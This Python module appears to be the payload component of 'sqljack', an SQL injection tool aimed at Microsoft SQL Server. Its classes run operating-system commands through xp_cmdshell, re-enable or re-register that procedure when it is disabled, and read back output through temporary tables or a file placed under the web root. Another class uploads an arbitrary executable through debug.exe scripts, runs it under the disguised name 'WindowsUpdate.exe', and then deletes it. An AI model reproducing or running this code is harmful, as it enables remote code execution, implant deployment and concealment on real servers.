# -*- coding: utf-8 -*-
###
# STD modules
###
import os, sys, logging, re, binascii

###
# sqljack
###
import libsqljack

class payload_exec_via_file(libsqljack.payload_generic):

    def __init__(self, url):
        self.exec_procname = 'xp_cmdshell'
        super(payload_exec_via_file, self).__init__(url)

    def build_payload(self, cmd, *args):
        self.mark_rand = libsqljack.mkrandstr(8)
        if not len(args):
            self.log.error("No output path specified. Aborting ...\nExample: %s <URL> <CMD> -p exec_via_file 'C:\inetpub\wwwroot'\n" % sys.argv[0])
            yield False
        fullcmd = 'echo %s > %s\\output.txt' % (self.mark_rand, args[0])
        yield {'mssql_exec' : self.build_mssql_exec(fullcmd)}
        fullcmd = '%s >> %s\\output.txt' % (cmd, args[0])
        yield {'mssql_exec' : self.build_mssql_exec(fullcmd)}

    def get_output(self):#, cmd, *args):
        basedir = os.path.split(self.url)[0]
        out = libsqljack.send_web_request("%s/output.txt" % basedir)
        matches = re.findall("%s\s*(.*)" % self.mark_rand, out, re.DOTALL)
        if matches:
            return matches[0]
        return ""

    def build_mssql_exec(self, cmd):
        return "EXEC master..%s '%s'" % (self.exec_procname, cmd)

class payload_exec_via_file_reconf(payload_exec_via_file):

    def build_payload(self, cmd, *args):
        yield {'mssql_exec' : "EXEC sp_configure 'show advanced options',1"}
        yield {'mssql_exec' : "RECONFIGURE"}
        yield {'mssql_exec' : "EXEC sp_configure 'xp_cmdshell', 1"}
        yield {'mssql_exec' : "RECONFIGURE"}
        for val in super(payload_exec_via_file_reconf, self).build_payload(cmd, *args):
            yield val

class payload_exec_via_file_extproc(payload_exec_via_file):

    def build_payload(self, cmd, *args):
        self.exec_procname = "xp_runcmd"
        yield {'mssql_exec' : "EXEC sp_addextendedproc '%s', 'xplog70.dll'" % self.exec_procname}
        for val in super(payload_exec_via_file_extproc, self).build_payload(cmd, *args):
            yield val

class payload_exec_via_table(payload_exec_via_file):

    def build_payload(self, cmd, *args):
        self.col_data = 'data'
        self.tbl_name = "tbl%s" % libsqljack.mkrandstr(8)
        self.lines = []
        self._mode = "init"
        self.log.info("Executing command ...")
        yield {'mssql_exec' : 'CREATE TABLE %s (id INT NOT NULL IDENTITY(1,1) PRIMARY KEY, %s varchar(8000))' % (
            self.tbl_name, self.col_data
        )}
        yield {'mssql_exec' : 'INSERT INTO %s %s' % (self.tbl_name, self.build_mssql_exec(cmd))}
        self._mode = "dump"
        self.log.info("Fetching command output ...")
        self.row_num = 1
        subquery = 'SELECT TOP %%d id, %s FROM %s ORDER BY id ASC' % (self.col_data, self.tbl_name)
        topquery = "(SELECT TOP 1 %s FROM (%%s) x ORDER BY id DESC)" % self.col_data
        self._dump = True
        while self._dump:
            query = subquery % self.row_num
            self.row_num += 1
            yield {'mssql_inject' : topquery % query}
        self._mode = "clean"
        self.log.info("Cleaning temporary data ...")
        yield {'mssql_exec' : 'DROP TABLE %s' % self.tbl_name}

    def parse_result(self, result):
        if not result:
            self._dump = False
        if self._mode == "dump":
            self.lines.append(result)

    def get_output(self):
        return "".join(self.lines)

class payload_exec_upload_via_table(payload_exec_via_table):

    def build_payload(self, cmd, *args):
        if not len(args):
          self.log.error("No binary specified. Aborting ...\nExample: %s <URL> mosdef.exe -p exec_upload_via_table '/tmp/mosdef.exe' 192.168.0.1 5555\n" % sys.argv[0])
          sys.exit(-1)
        self.updir = 'C:\\'
        self.dstscr = 'PwnWindowsLive.scr'
        self.dsttmp = libsqljack.mkrandstr(4).upper() + ".txt"
        self.dstbin = 'WindowsUpdate.exe'
        self._mode = "write_script"
        self.lines = []
        lfile = args[0]
        if not os.path.exists(lfile):
            self.log.error("Failed to open file: %s" % lfile)
            sys.exit(-1)
        self.log.info("Uploading file %s ..." % lfile)
        data = open(lfile).read()
        pos = 0
        bsize = 1024
        if len(data) < bsize:
            bsize = len(data)
        count = 0
        prefix = '& ren %s %s' % (self.dsttmp, self.dstbin)
        while True:
            slice = data[pos:pos + bsize]
            lines = self.encode_chunk(slice)
            cmd = "cd %s & " % self.updir
            cmd += " & ".join(["echo %s >> %s" % (line, self.dstscr) for line in lines])
            sys.stderr.write(".")
            cmd += ' & debug < %s %s & copy /B /Y %s+%s %s & del /F %s' % (self.dstscr, prefix, self.dstbin, self.dsttmp, self.dstbin, self.dstscr)
            prefix = ''
            yield {'mssql_exec' : self.build_mssql_exec(cmd)}
            pos += bsize
            if pos > len(data):
                break
        sys.stderr.write("\n")
        binargs = " ".join(args[1:])
        self.log.info("Uploaded OK. Executing %s %s ..." % (self.dstbin, binargs))
        self._mode = "exec"
        yield {'mssql_exec' : self.build_mssql_exec("cd %s & %s %s" % (self.updir, self.dstbin, binargs))}
        self.log.info("Removing uploaded file ...")
        self._mode = "delete"
        yield {'mssql_exec' : self.build_mssql_exec("del /F %s" % (self.dstbin))}

    def encode_chunk(self, binaryData):
            fileLines = []
            fileSize  = len(binaryData)
            lineAddr  = 0x100
            lineLen   = 20
            fileLines.append("n %s" % self.dsttmp)
            fileLines.append("rcx")
            fileLines.append("%x" % fileSize)
            fileLines.append("f 0100 %x 00" % fileSize)
            for fileLine in range(0, len(binaryData), lineLen):
                scrString = ""
                for lineChar in binaryData[fileLine:fileLine+lineLen]:
                    strLineChar = binascii.hexlify(lineChar)
                    if not scrString:
                        scrString  = "e %x %s" % (lineAddr, strLineChar)
                    else:
                        scrString += " %s" % strLineChar
                    lineAddr += len(lineChar)
                fileLines.append(scrString)
            fileLines.append("w")
            fileLines.append("q")
            return fileLines

class payload_default(payload_exec_via_table):
    pass
